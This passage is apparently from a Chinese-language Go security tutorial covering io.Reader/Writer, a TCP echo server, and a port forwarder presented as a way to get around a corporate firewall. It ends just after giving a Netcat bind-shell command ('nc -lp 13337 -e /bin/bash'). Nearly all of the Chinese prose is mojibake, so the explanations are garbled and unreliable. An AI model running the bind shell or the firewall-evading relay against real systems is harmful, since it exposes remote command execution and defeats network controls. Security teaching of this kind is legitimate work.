æ–¹æ³•æ‰èƒ½è¢«è§†ä¸º Reader æˆ– Writer\nä¾‹å¦‚ï¼Œä»¥ä¸‹è‡ªå®šä¹‰çš„ç»“æ„ä½“ç±»å‹ FooReader å¯ä»¥æ»¡è¶³çº¦å®šï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä»»ä½•æ¥å— Reader å’Œ Writer çš„åœ°æ–¹ä½¿ç”¨ã€‚\ntype FooReader struct{} func (f *FooReader) Read(p []byte) (int, error) { // ä»æŸå¤„ï¼ˆä»»ä½•åœ°æ–¹ï¼‰è¯»å–ä¸€äº›æ•°æ® return len(dataReadFromSomewhere), nil } func (f *FooReader) Write(p []byte) (int, error) { // å°†æ•°æ®å†™å…¥æŸå¤„ return len(dataReadFromSomewhere), nil } å‚ç…§ä¸Šè¿°ç¤ºä¾‹ï¼Œå¯ä»¥è‡ªå®šä¹‰åŒ…è£…äº† stdin å’Œ stdout çš„ Reader å’Œ Writer ã€‚è‡ªä» Go çš„ os.Stdin å’Œ os.Stdout ç±»å‹å……å½“ Reader å’Œ Writer ä»¥æ¥ï¼Œå¾ˆå¤šäººç¼–å†™è¿‡ä¸æ­¤ç›¸å…³çš„ä»£ç ï¼Œä½†å¦‚æœä½ ä¸æ—¶å¸¸é‡æ–°é€ è½®å­ï¼Œé‚£ä¹ˆå°±å¯èƒ½å­¦ä¸åˆ°ä»»ä½•ä¸œè¥¿ã€‚\nç»“æ„ä½“ç±»å‹ FooWriter å’Œ FooReader çš„å®Œæ•´å®ç°:\npackage main import ( \"fmt\" \"log\" \"os\" ) // FooReader å®šä¹‰äº†ä¸€ä¸ªä»æ ‡å‡†è¾“å…¥ (stdin) è¯»å–çš„ io.Reader. type FooReader struct{} // Read ä»æ ‡å‡†è¾“å…¥ (stdin) è¯»å–æ•°æ® func (f *FooReader) Read(b []byte) (int, error) { fmt.Print(\"in \u003e \") return os.Stdin.Read(b) } // FooWriter å®šä¹‰äº†ä¸€ä¸ªå†™å…¥æ ‡å‡†è¾“å‡º (stdout) çš„ io.Writer type FooWriter struct{} // Write å°†æ•°æ®å†™å…¥æ ‡å‡†è¾“å‡º (stdout) func (f *FooWriter) Write(b []byte) (int, error) { fmt.Print(\"out\u003e \") return os.Stdout.Write(b) } func main() { // å®ä¾‹åŒ– reader å’Œ writer var ( reader FooReader writer FooWriter ) // åˆ›å»ºç¼“å†²åŒºä»¥ä¿å­˜è¾“å…¥/è¾“å‡º input := make([]byte, 4096) // ä½¿ç”¨ reader è¯»å–è¾“å…¥ s, err := reader.Read(input) if err != nil { log.Fatalln(\"Unable to read data\") } fmt.Printf(\"Read %d bytes from stdin\\n\", s) // ä½¿ç”¨ writer å†™å…¥è¾“å‡º s, err = writer.Write(input) if err != nil { log.Fatalln(\"Unable to write data\") } fmt.Printf(\"Wrote %d bytes to stdout\\n\", s) } å°†æ•°æ®ä» Reader å¤åˆ¶åˆ° Writer æ˜¯ä¸€ç§éå¸¸å¸¸è§çš„æ¨¡å¼ï¼Œè¿™ä¿ƒä½¿ Go çš„ io åŒ…ä¸­æä¾›ä¸€ä¸ªå‡½æ•° Copy() ,è¯¥å‡½æ•°å¯ç”¨äºç®€åŒ–å‡½æ•° main() ã€‚å‡½æ•°Copy()åŸå‹å¦‚ä¸‹ã€‚\nfunc Copy(dst Writer, src Reader) (written int64, err error) ä½¿ç”¨è¿™ä¸ªå‡½æ•° Copy() å¯ä»¥å®ç°ä¸ä»¥å‰ç›¸åŒçš„æ•ˆæœ\npackage main import ( \"fmt\" \"io\" \"log\" \"os\" ) // FooReader defines an io.Reader to read from stdin. type FooReader struct{} // Read reads data from stdin. func (fooReader *FooReader) Read(b []byte) (int, error) { fmt.Print(\"in \u003e \") return os.Stdin.Read(b) } // FooWriter defines an io.Writer to write to Stdout. type FooWriter struct{} // Write writes data to Stdout. func (fooWriter *FooWriter) Write(b []byte) (int, error) { fmt.Print(\"out\u003e \") return os.Stdout.Write(b) } func main() { // Instantiate reader and writer. var ( reader FooReader writer FooWriter ) if _, err := io.Copy(\u0026writer, \u0026reader); err != nil { log.Fatalln(\"Unable to read/write data\") } } æ³¨æ„ï¼Œå¯¹ reader.Read([]byte) å’Œ writer.Write([]byte) çš„æ˜¾å¼è°ƒç”¨å·²æ›¿æ¢ä¸ºå¯¹ io.Copy(writer,,reader) çš„å•ä¸ªè°ƒç”¨ã€‚èƒŒåçš„æœºåˆ¶æ˜¯ io.Copy(writer,reader) è°ƒç”¨æä¾›çš„ reader ä¸Šçš„å‡½æ•° Read([]byte) ,è§¦å‘ FooReader ä» stdin è¯»å–ã€‚éšåï¼Œ io.Copy(writer,reader) åœ¨ writer ä¸Šè°ƒç”¨å‡½æ•° Wite([]byte) ,ä»è€Œå¼•èµ·å¯¹ FooWriter çš„è°ƒç”¨ï¼Œè€Œ FooWriter åˆ™å°†æ•°æ®å†™å…¥ stdout ã€‚å®é™…ä¸Šï¼Œio.Copy(writer,reader) æŒ‰é¡ºåºå¤„ç†å…ˆè¯»åå†™çš„è¿‡ç¨‹ï¼Œè€Œæ— é¡»å¤„ç†å„ç§çç¢çš„ç»†èŠ‚ã€‚\næœ¬éƒ¨åˆ†å†…å®¹ç»ä¸æ˜¯å¯¹ Go çš„ I/O å’Œæ¥å£çš„å…¨é¢ä»‹ç»ã€‚è®¸å¤šä¾¿æ·å‡½æ•°ä»¥åŠè‡ªå®šä¹‰çš„ Reader å’Œ Writer åªæ˜¯ Go æ ‡å‡†åŒ…çš„å…¶ä¸­ä¸€ä¸ªç»„æˆéƒ¨åˆ†ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒGoçš„æ ‡å‡†åŒ…éƒ½åŒ…å«æ‰€æœ‰ç”¨äºå®Œæˆæœ€å¸¸è§ä»»åŠ¡çš„åŸºæœ¬å®ç°ã€‚åœ¨ä¸‹ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æ¢è®¨å¦‚ä½•å°†è¿™äº›åŸºç¡€çŸ¥è¯†åº”ç”¨åˆ°TCPé€šä¿¡ä¸­ï¼Œä»¥ä½¿ä½ èƒ½å¼€å‘ä¸€äº›å®ç”¨å·¥å…·ã€‚\n2.2 åˆ›å»ºå›æ˜¾æœåŠ¡å™¨ æŒ‰ç…§å¤§å¤šæ•°è¯­è¨€çš„ä¹ æƒ¯ï¼Œé¦–å…ˆéœ€è¦æ„å»ºä¸€ä¸ªå›æ˜¾æœåŠ¡å™¨ï¼Œä»¥å­¦ä¹ å¦‚ä½•åœ¨å¥—æ¥å­—ä¸­è¯»å†™æ•°æ®ã€‚ä¸ºæ­¤ï¼Œéœ€è¦ç”¨åˆ° net.Conn ( Go çš„é¢å‘æµçš„ç½‘ç»œè¿æ¥)ï¼Œæˆ‘ä»¬åœ¨æ„å»ºç«¯å£æ‰«æå™¨æ—¶å¯¹æ­¤æœ‰è¿‡ä»‹ç»ã€‚ç”± Go çš„æ–‡æ¡£å¯çŸ¥ï¼ŒConn å®ç°äº†é’ˆå¯¹æ¥å£ Reader å’Œ Writer å®šä¹‰çš„å‡½æ•° Read([]byte) å’Œ Write([]byte) ã€‚å› æ­¤ï¼ŒConnå¯ä»¥æ—¢æ˜¯ Reader åˆæ˜¯ Writer ã€‚ä»é€»è¾‘ä¸Šè®²è¿™æ˜¯åˆç†çš„ï¼Œå› ä¸º TCP è¿æ¥æ˜¯åŒå‘çš„ï¼Œå¯ä»¥ç”¨æ¥å‘é€ï¼ˆå†™å…¥ï¼‰æˆ–æ¥æ”¶ï¼ˆè¯»å–ï¼‰æ•°æ®ã€‚\nåˆ›å»º Conn å®ä¾‹åï¼Œå¯ä»¥é€šè¿‡ TCP å¥—æ¥å­—å‘é€å’Œæ¥æ”¶æ•°æ®ã€‚ä¸è¿‡ï¼ŒTCPæœåŠ¡å™¨ä¸èƒ½ç®€å•åœ°åˆ›å»ºä¸€ä¸ªè¿æ¥ï¼Œè¿æ¥å¿…é¡»ç”±å®¢æˆ·ç«¯å‘èµ·å»ºç«‹ã€‚åœ¨ Go ä¸­ï¼Œé¦–å…ˆå¯ä»¥ä½¿ç”¨ net.Listen(network,address string) åœ¨ç‰¹å®šç«¯å£ä¸Šæ‰“å¼€ TCP ç›‘å¬å™¨ã€‚å®¢æˆ·ç«¯è¿æ¥åï¼Œæ–¹æ³• Accept() å°†åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ª Conn å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨è¯¥å¯¹è±¡æ¥æ”¶å’Œå‘é€æ•°æ®ã€‚\nå®ç°å›æ˜¾æœåŠ¡å™¨çš„å®Œæ•´ç¤ºä¾‹:\npackage main import ( \"io\" \"log\" \"net\" ) // echo is a handler function that simply echoes received data. // echo æ˜¯ä¸€ä¸ªå¤„ç†ï¼ˆhandlerï¼‰å‡½æ•°,å®ƒä»…å›æ˜¾æ¥æ”¶åˆ°çš„æ•°æ® func echo(conn net.Conn) { defer conn.Close() // Create a buffer to store received data. // åˆ›å»ºä¸€ä¸ªç¼“å†²åŒºæ¥å­˜å‚¨æ¥æ”¶åˆ°çš„æ•°æ® b := make([]byte, 512) for { // Receive data via conn.Read into a buffer. // é€šè¿‡ conn.Read æ¥æ”¶æ•°æ®åˆ°ä¸€ä¸ªç¼“å†²åŒº size, err := conn.Read(b[0:]) if err != nil \u0026\u0026 err != io.EOF { log.Println(\"Unexpected error\") break } if err == io.EOF \u0026\u0026 size == 0 { log.Println(\"Client disconnected\") break } log.Printf(\"Received %d bytes: %s\", size, string(b)) // Send data via conn.Write. // é€šè¿‡ conn.Write å‘é€æ•°æ® log.Println(\"Writing data\") if _, err := conn.Write(b[0:size]); err != nil { log.Fatalln(\"Unable to write data\") } } } func main() { // Bind to TCP port 20080 on all interfaces. // åœ¨æ‰€æœ‰æ¥å£ä¸Šç»‘å®š Tcp ç«¯å£ 20080 listener, err := net.Listen(\"tcp\", \":20080\") if err != nil { log.Fatalln(\"Unable to bind to port\") } log.Println(\"Listening on 0.0.0.0:20080\") for { // Wait for connection. Create net.Conn on connection established. // ç­‰å¾…è¿æ¥ã€‚åœ¨å·²å»ºç«‹çš„è¿æ¥ä¸Šåˆ›å»º net.conn conn, err := listener.Accept() log.Println(\"Received connection\") if err != nil { log.Fatalln(\"Unable to accept connection\") } // Handle the connection. Using goroutine for concurrency. // å¤„ç†è¿æ¥ã€‚ä½¿ç”¨ goroutine å®ç°å¹¶å‘ go echo(conn) } } é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªåä¸º echo(net.Conn) çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°æ¥æ”¶ Conn å®ä¾‹ä½œä¸ºå‚æ•°ã€‚å®ƒå……å½“æ‰§è¡Œæ‰€æœ‰å¿…è¦çš„ I/O è¿æ¥çš„å¤„ç†ç¨‹åºã€‚è¯¥å‡½æ•°ä½¿ç”¨ç¼“å†²ä»è¿æ¥è¯»å–æ•°æ®ä»¥åŠå‘è¿æ¥å†™å…¥æ•°æ®ï¼Œè¿›è¡Œæ— é™å¾ªç¯ã€‚æ•°æ®ä¼šè¢«è¯»å…¥ä¸€ä¸ªåä¸º b çš„å˜é‡ä¸­ï¼Œå†å†™å›è¯¥è¿æ¥ã€‚\nç°åœ¨ï¼Œéœ€è¦è®¾ç½®ä¸€ä¸ªç›‘å¬å™¨ï¼Œè¯¥ç›‘å¬å™¨å°†è°ƒç”¨å¤„ç†ç¨‹åºã€‚å¦‚å‰æ‰€è¿°ï¼ŒæœåŠ¡å™¨æ— æ³•å»ºç«‹è¿æ¥ï¼Œä¸”å¿…é¡»ç›‘å¬æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ã€‚å› æ­¤ï¼Œä½¿ç”¨ net.Listen(network,address string) å‡½æ•°åœ¨æ‰€æœ‰æ¥å£ä¸Šå¯ç”¨å®šä¹‰ä¸ºç»‘å®šåˆ° TCP ç«¯å£ 20080 çš„ç›‘å¬å™¨ã€‚\næ¥ä¸‹æ¥ï¼Œæ— é™å¾ªç¯ç¡®ä¿å³ä½¿å·±ç»æ”¶åˆ°ä¸€ä¸ªè¿æ¥ï¼ŒæœåŠ¡å™¨ä»å°†ç»§ç»­ç›‘å¬æ–°çš„è¿æ¥è¯·æ±‚ã€‚åœ¨æ­¤å¾ªç¯ä¸­ï¼Œè°ƒç”¨ listener.Accept() æ¥å—å®¢æˆ·ç«¯çš„è¿æ¥ã€‚å½“å®¢æˆ·ç«¯è¿æ¥æˆåŠŸæ—¶ï¼Œæ­¤å‡½æ•°è¿”å›ä¸€ä¸ª Conn å®ä¾‹ã€‚å›æƒ³æœ¬èŠ‚å‰é¢æ‰€è¿°çš„å†…å®¹ï¼Œå³ Conn æ—¢æ˜¯ Reader ä¹Ÿæ˜¯ Writer ,å®ƒå®ç°äº† Read([]byte) å’Œ Write([]byte)æ–¹æ³•ã€‚\nä¹‹åï¼Œå°† Conn å®ä¾‹ä¼ é€’ç»™å¤„ç†å‡½æ•° echo(net.Conn)ã€‚è¯¥è°ƒç”¨ä»¥å…³é”®å­— go å¼€å¤´ï¼Œä½¿å…¶æˆä¸ºå¹¶å‘è°ƒç”¨ï¼Œä»¥ä¾¿åœ¨ç­‰å¾…å¤„ç†å‡½æ•°å®Œæˆæ—¶å…¶ä»–è¿æ¥ä¸ä¼šé˜»å¡ã€‚å¯¹äºè¿™æ ·ä¸€ä¸ªç®€å•çš„å›æ˜¾æœåŠ¡å™¨æ¥è¯´ï¼Œæ‰§è¡Œä»¥ä¸Šæ“ä½œå¯èƒ½å¹¶ä¸å®¹æ˜“ã€‚ä½†æˆ‘ä»¬ä¹‹æ‰€ä»¥ä¼šèŠ±ç¬”å¢¨å¯¹å…¶è¿›è¡Œä»‹ç»æ˜¯ä¸ºäº†è®©ä½ æ›´å¥½åœ°ç†è§£ Go å¹¶å‘æ¨¡å¼çš„ç®€å•æ€§ã€‚æ­¤æ—¶ï¼Œæœ‰ä¸¤ä¸ªè½»é‡çº§çº¿ç¨‹åœ¨åŒæ—¶è¿è¡Œã€‚\nä¸»çº¿ç¨‹å¾ªç¯è¿”å›å¹¶åœ¨ listener.Accept() ç­‰å¾…å¦ä¸€ä¸ªè¿æ¥æ—¶é˜»å¡ã€‚ å¤„ç†ç¨‹åº goroutine çš„æ‰§è¡Œå·±è½¬ç§»åˆ°å‡½æ•° echo(net.Conn) ,ç»§ç»­è¿è¡Œå¹¶å¤„ç†æ•°æ® è¿™ä¸ªå›æ˜¾æœåŠ¡å™¨å°†å®¢æˆ·ç«¯å‘é€ç»™å®ƒçš„å†…å®¹å®Œå…¨é‡å¤åœ°å‘å›ç»™å®¢æˆ·ç«¯ã€‚å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªç®€å•ã€æœ‰ç”¨çš„ä¾‹å­ã€‚\n2.3 é€šè¿‡åˆ›å»ºå¸¦ç¼“å†²çš„ç›‘å¬å™¨æ¥æ”¹è¿›ä»£ç  ä¸Šé¢çš„ç¤ºä¾‹å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯ä¾èµ–ç›¸å½“ä½çº§çš„å‡½æ•°è°ƒç”¨ã€ç¼“å†²åŒºè·Ÿè¸ªä»¥åŠé‡å¤çš„è¯»/å†™ã€‚å…¶è¿è¡Œè¿‡ç¨‹å¾ˆä¹å‘³ä¸”å®¹æ˜“å‡ºé”™ã€‚ä¸è¿‡ï¼Œ Go è¿˜åŒ…å«å…¶ä»–ä¸€äº›å¯ä»¥ç®€åŒ–æ­¤è¿‡ç¨‹å¹¶é™ä½ä»£ç å¤æ‚æ€§çš„åŒ…ï¼Œå…·ä½“æ¥è¯´ï¼Œbufio åŒ…åŒ…è£…äº† Reader å’Œ Writer ,ä»¥åˆ›å»º I/Oç¼“å†²æœºåˆ¶ã€‚æ›´æ–°åçš„å‡½æ•° echoï¼ˆnet.Connï¼‰ä»¥åŠå¯¹æ­¤çš„è¯¦ç»†è®²è§£å¦‚ä¸‹æ‰€ç¤ºã€‚\nfunc echo(conn net.Conn) { defer conn.Close() reader := bufio.NewReader(conn) s, err := reader.ReadString('\\n') if err != nil { log.Fatalln(\"Unable to read data\") } log.Printf(\"Received %d bytes: %s\", len(s), s) log.Println(\"Writing data\") writer := bufio.NewWriter(conn) if _, err := writer.WriteString(s); err != nil { log.Fatalln(\"Unable to write data\") } writer.Flush() } ä¸å†æ˜¯ç›´æ¥åœ¨ Conn å®ä¾‹ä¸Šè°ƒç”¨å‡½æ•° Read([]byte) å’Œ Write([]byte),è€Œæ˜¯é€šè¿‡ NewReader(io.Reader) å’Œ NewWriter(io.Writer) åˆå§‹åŒ–æ–°çš„å¸¦ç¼“å†²çš„ Reader å’Œ Writer ã€‚è¿™äº›è°ƒç”¨éƒ½ä»¥ç°æœ‰çš„ Reader å’Œ Writer ä½œä¸ºå‚æ•°ï¼ˆè®°ä½ï¼ŒConnç±»å‹å®ç°äº†ä¸€äº›å¿…è¦çš„åŠŸèƒ½ï¼Œä½¿å…¶èƒ½åŒæ—¶è¢«è§†ä¸º Reader å’Œ Writer )ã€‚\nä¸¤ä¸ªç¼“å†²å®ä¾‹éƒ½å…·æœ‰ç”¨äºè¯»å–å’Œå†™å…¥å­—ç¬¦ä¸²æ•°æ®çš„åŠŸèƒ½ã€‚ReadString([]byte) å¸¦æœ‰ä¸€ä¸ªåˆ†éš”ç¬¦ï¼Œç”¨äºè¡¨ç¤ºè¯»å–é•¿åº¦ï¼Œè€Œ WriteString([]byte) åˆ™å°†å­—ç¬¦ä¸²å†™å…¥å¥—æ¥å­—ã€‚å†™å…¥æ•°æ®æ—¶ï¼Œéœ€è¦æ˜¾å¼è°ƒç”¨ writer.Flush() ä»¥å°†æ‰€æœ‰æ•°æ®å†™å…¥åº•å±‚çš„ writer (åœ¨è¿™é‡Œä¸º Conn å®ä¾‹)ã€‚\nå°½ç®¡å‰é¢çš„ç¤ºä¾‹é€šè¿‡ä½¿ç”¨ç¼“å†²çš„ I/O ç®€åŒ–äº†å…¶è¿è¡Œè¿‡ç¨‹ï¼Œä½†æ˜¯ä½ è¿˜å¯ä»¥è¿›ä¸€æ­¥ç®€åŒ–æ­¤è¿‡ç¨‹ï¼Œè¦ç”¨åˆ°çš„å°±æ˜¯ä¾¿æ·å‡½æ•° Copy(Writer,Reader) ã€‚å¦‚å‰æ‰€è¿°ï¼Œè¿™ä¸ªå‡½æ•°å°† ç›®æ ‡Writer å’Œ æºReader ä½œä¸ºå‚æ•°ï¼Œåªéœ€è¦ä»æºå¤åˆ¶åˆ°ç›®æ ‡å³å¯ã€‚\nåœ¨æ­¤ç¤ºä¾‹ä¸­,å°†å˜é‡ conn ä½œä¸ºæºå’Œç›®æ ‡ä¼ é€’,å› ä¸ºå°†åœ¨å»ºç«‹çš„è¿æ¥ä¸Šå›æ˜¾å†…å®¹ã€‚\nfunc echo(conn net.Conn) { defer conn.Close() // ä½¿ç”¨ io.Copy() å°†æ•°æ®ä» io.Reader å¤åˆ¶åˆ° io.Writer if _, err := io.Copy(conn, conn); err != nil { log.Fatalln(\"Unable to read/write data\") } } åˆ°è¿™é‡Œä½ å·²ç»äº†è§£äº† I/O çš„åŸºç¡€çŸ¥è¯†å¹¶èƒ½å°†å…¶åº”ç”¨äº TCP æœåŠ¡å™¨ä¸­ã€‚ç°åœ¨ç»§ç»­æ¢ç´¢æ›´å¤šæœ‰ç”¨çš„ç›¸å…³ç¤ºä¾‹ã€‚\n2.4 ä»£ç†ä¸€ä¸ªTCPå®¢æˆ·ç«¯ é€šè¿‡ç«¯å£è½¬å‘ç»•è¿‡é˜²ç«å¢™\næŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä¸­é—´ç³»ç»Ÿä»£ç†è¿æ¥ç»•è¿‡æˆ–ç©¿é€é˜²ç«å¢™ä»è€Œé¿å¼€è¿™äº›é™åˆ¶ï¼Œè¿™ç§æŠ€æœ¯è¢«ç§°ä¸ºç«¯å£è½¬å‘ã€‚\nå®¢æˆ·ç«¯é€šè¿‡é˜²ç«å¢™è¿æ¥åˆ°ç›®æ ‡ä¸»æœºstacktitan.comã€‚è¯¥ä¸»æœºé…ç½®ä¸ºå°†è¿æ¥è½¬å‘åˆ°ä¸»æœºevil.comã€‚å°½ç®¡é˜²ç«å¢™ç¦æ­¢ç›´æ¥è¿æ¥åˆ°evil.com,ä½†å¦‚æœæœ‰äº†ä¸Šé¢è¿™æ ·çš„é…ç½®ï¼Œå°±å¯ä»¥ä½¿å®¢æˆ·ç«¯ç»•è¿‡æ­¤ä¿æŠ¤æœºåˆ¶å»è®¿é—®evil.comã€‚\nç°åœ¨ä½ å·±ç»æœ‰äº†åšå®çš„åŸºç¡€ï¼Œå¯ä»¥åˆ©ç”¨æ‰€å­¦çš„çŸ¥è¯†åˆ›å»ºä¸€ä¸ªç®€å•çš„ç«¯å£è½¬å‘å™¨ï¼Œä»¥é€šè¿‡ä»£ç†æœåŠ¡æˆ–ä¸»æœºä»£ç†å»ºç«‹è¿æ¥ã€‚å¦‚æœ¬ç« å‰é¢æ‰€è¿°ï¼Œè¿™å¯¹äºå°è¯•è§„é¿é™åˆ¶æ€§å‡ºå£æ§åˆ¶æˆ–åˆ©ç”¨ç³»ç»Ÿç»•è¿‡ç½‘ç»œåˆ†æ®µå¾ˆæœ‰ç”¨ã€‚\nåœ¨ç¼–å†™ä»£ç ä¹‹å‰,è¯·å…ˆæ€è€ƒä¸‹é¢è¿™ä¸ªè™šæ„ä½†ç°å®çš„é—®é¢˜:\nJoe åœ¨ ACME Inc.æ‹…ä»»ä¸šåŠ¡åˆ†æå¸ˆä¸€èŒï¼Œç”±äºä»–çš„ç®€å†å†™å¾—å¾ˆæ¼‚äº®ï¼Œå› æ­¤æ‹¿åˆ°äº†å¯è§‚çš„è–ªæ°´ã€‚ä¸è¿‡ï¼Œåœ¨å·¥ä½œä¸­ï¼Œä»–è¡¨ç°ä¸ä½³ï¼Œç¼ºä¹å¹²åŠ²ã€‚ä»–æŠŠæœ¬è¯¥æŠ•å…¥å·¥ä½œä¸­çš„çƒ­æƒ…å…¨éƒ¨å€¾æ³¨åˆ°å®¶é‡Œçš„çŒ«èº«ä¸Šã€‚ä»–åœ¨å®¶é‡Œç»™çŒ«å®‰è£…äº†æ‘„åƒå¤´å¹¶å»ºç«‹äº†ä¸€ä¸ªç½‘ç«™ joescatcam.website ,ä»–å¯ä»¥é€šè¿‡å®ƒè¿œç¨‹ç›‘è§†ä»–çš„çŒ«ã€‚ä½†é—®é¢˜æ˜¯ Joe ç°åœ¨æ˜¯ä¸º ACME å·¥ä½œã€‚ACME è‚¯å®šä¸æƒ³è®©ä»–ä¸€å¤©24å°æ—¶éƒ½åœ¨ä½¿ç”¨å…¬å¸çš„ç½‘ç»œå¸¦å®½æŸ¥çœ‹ä»–çš„é«˜æ¸…æ‘„åƒå¤´ç›‘æ§çš„å…³äºçŒ«çš„è§†é¢‘ï¼›ACME ç”šè‡³ä¸è®©å…¶ä»–å‘˜å·¥è®¿é—® Joe åˆ›å»ºçš„ joescatcam.website ç½‘ç«™ã€‚\nJoe æƒ³åˆ°ä¸€ä¸ªä¸»æ„ï¼Œå³â€œå¦‚æœæˆ‘ä½¿ç”¨è‡ªå·±æ§åˆ¶çš„åŸºäºäº’è”ç½‘çš„ç³»ç»Ÿæ„å»ºä¸€ä¸ªç«¯å£è½¬å‘å™¨ï¼Œæ˜¯å¦å¯ä»¥å¼ºåˆ¶å°†æ‰€æœ‰æµé‡ä»é‚£ä¸ªä¸»æœºé‡å®šå‘åˆ° joescatcam.website å‘¢â€ã€‚ç¬¬äºŒå¤©ï¼Œ Joe è¿›è¡Œäº†æµ‹è¯•å¹¶ç¡®è®¤ä»–å¯ä»¥è®¿é—®ä½äº joesproxy.com åŸŸçš„ä¸ªäººç½‘ç«™ã€‚Joe æœ¬æ¥åº”è¯¥å‚åŠ å½“å¤©ä¸‹åˆå¬å¼€çš„ä¸€ä¸ªä¼šè®®ï¼Œä½†ä»–æ²¡æœ‰å‚åŠ ï¼Œè€Œæ˜¯æ‰¾äº†ä¸€å®¶å’–å•¡åº—å¹¶åœ¨é‚£é‡Œè¿…é€Ÿä¸ºä»–çš„é—®é¢˜å¼€å‘äº†è§£å†³æ–¹æ¡ˆã€‚ä»–å°†æŠŠä» http://joesproxy.com ä¸Šæ”¶åˆ°çš„æ‰€æœ‰æµé‡è½¬å‘åˆ° http://joescatcam.website ä¸Šã€‚\nä»¥ä¸‹æ˜¯ Joe åœ¨ joesproxy.com æœåŠ¡å™¨ä¸Šè¿è¡Œçš„ä»£ç ã€‚\npackage main import ( \"io\" \"log\" \"net\" ) func handler(src net.Conn) { dst, err := net.Dial(\"tcp\", \"joescatcam.website:80\") if err != nil { log.Fatalln(\"Unable to connect to our unreachable host\") } defer dst.Close() // åœ¨ goroutine ä¸­è¿è¡Œä»¥é˜²æ­¢ io.Copy è¢«é˜»å¡ go func() { // å°†æºçš„è¾“å‡ºå¤åˆ¶åˆ°ç›®æ ‡ if _, err := io.Copy(dst, src); err != nil { log.Fatalln(err) } }() // å°†ç›®æ ‡çš„è¾“å‡ºå¤åˆ¶å›æº if _, err := io.Copy(src, dst); err != nil { log.Fatalln(err) } } func main() { // åœ¨æœ¬åœ°ç«¯å£ 80 ä¸Šç›‘å¬ listener, err := net.Listen(\"tcp\", \":80\") if err != nil { log.Fatalln(\"Unable to bind to port\") } for { conn, err := listener.Accept() if err != nil { log.Fatalln(\"Unable to accept connection\") } go handler(conn) } } é¦–å…ˆçœ‹ Joe çš„ handle(net.Conn) å‡½æ•°ã€‚ Joe è¿æ¥åˆ° joescatcam.website ï¼ˆè®°ä½ï¼Œæ— æ³•ä» Joe å…¬å¸çš„ç”µè„‘ç›´æ¥è®¿é—®æ­¤ä¸»æœº)ã€‚ç„¶å Joe åˆ†åˆ«ä½¿ç”¨ä¸¤æ¬¡ Copy(Writer,Reader)ã€‚ç¬¬ä¸€ä¸ªå®ä¾‹ç¡®ä¿å°†æ¥è‡ªå…¥ç«™è¿æ¥çš„æ•°æ®å¤åˆ¶åˆ° joescatcam.website è¿æ¥ã€‚ç¬¬äºŒä¸ªå®ä¾‹ç¡®ä¿ä» joescatcam.website è¯»å–çš„æ•°æ®è¢«å†™å›åˆ°è¿æ¥å®¢æˆ·ç«¯çš„è¿æ¥ä¸­ã€‚å› ä¸º Copy(Writer,Reader) æ˜¯ä¸€ä¸ªé˜»å¡å‡½æ•°ï¼Œå¹¶ä¸”å°†ç»§ç»­é˜»å¡æ‰§è¡Œç›´åˆ°å…³é—­ç½‘ç»œè¿æ¥ï¼Œæ‰€ä»¥ Joe æ˜æ™ºåœ°å°†ä»– Copy(Writer,Reader) çš„ç¬¬ä¸€æ¬¡è°ƒç”¨åŒ…è£…åœ¨æ–°çš„ goroutine ä¸­ã€‚è¿™æ · handle(net.Conn) å‡½æ•°ä¸­çš„æ‰§è¡Œå°±å¾—ä»¥ç»§ç»­è¿›è¡Œï¼Œå¹¶ä¸”å¯ä»¥è¿›è¡Œç¬¬äºŒ Copy(Writer,Reader) è°ƒç”¨ã€‚\nJoe çš„ä»£ç†åœ¨ç«¯å£80ä¸Šç›‘å¬å¹¶ä¸­ç»§è¿æ¥åˆ° joescatcam.website:80 æ”¶å‘çš„æ‰€æœ‰æ•°æ®ã€‚Joe ç¡®è®¤ä»–å¯ä»¥ä½¿ç”¨ curl é€šè¿‡ joesproxy.com è¿æ¥åˆ° joescatcam.websiteã€‚æ¯”å¦‚ curl -i -X GET http://joesproxy.com 2.5 å¤ç° Netcat å‘½ä»¤æ‰§è¡Œ åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†å¤ç° Netcat çš„ä¸€äº›å¾ˆæœ‰è¶£çš„åŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯å®ƒçš„â€œå®‰å…¨å·¨æ´â€åŠŸèƒ½ã€‚ Netcat æ˜¯ TCP/IP ä¸Šçš„â€œç‘å£«å†›åˆ€â€ã€‚å…¶æœ¬è´¨ä¸Šå±äº Telnet çš„ä¸€ç§ï¼Œåªä¸è¿‡æ¯”èµ· Telnet,å®ƒæ›´çµæ´»ä¸”å¯ç¼–å†™è„šæœ¬ã€‚å®ƒåŒ…å«ä¸€é¡¹åœ¨ TCP ä¸Šé‡å®šå‘ä»»æ„ç¨‹åºçš„æ ‡å‡†è¾“å…¥(stdi)å’Œæ ‡å‡†è¾“å‡º(stdout)çš„åŠŸèƒ½ï¼Œä¾‹å¦‚ä½¿æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡å•ä¸€å‘½ä»¤æ‰§è¡Œæ¼æ´è®¿é—®æ“ä½œç³»ç»Ÿçš„ shell ã€‚å¯å‚è€ƒä»¥ä¸‹å‘½ä»¤ã€‚\nnc -lp 13337 -e /bin/bash è¯¥å‘½ä»¤åœ¨ç«¯å£ 13337 ä¸Šåˆ›å»ºäº†ä¸€ä¸ªç›‘å¬å™¨ã€‚ä»»ä½•å¯èƒ½é€šè¿‡ Telnet è¿æ¥çš„è¿œç¨‹å®¢æˆ·ç«¯éƒ½å¯ä»¥æ‰§è¡Œä»»æ„ bash å‘½ä»¤ï¼Œå› æ­¤è¿™è¢«ç§°ä¸ºâ€œå®‰å…¨å·¨æ´â€ã€‚Netcat å…è®¸ä½ åœ¨ç¨‹åºç¼–è¯‘æœŸé—´æ ¹æ®éœ€è¦æ·»åŠ æ­¤åŠŸèƒ½ï¼ˆåœ¨æ ‡å‡†Linuâ…¸ç‰ˆæœ¬ä¸Šæ‰¾åˆ°çš„å¤§å¤šæ•° Netcat 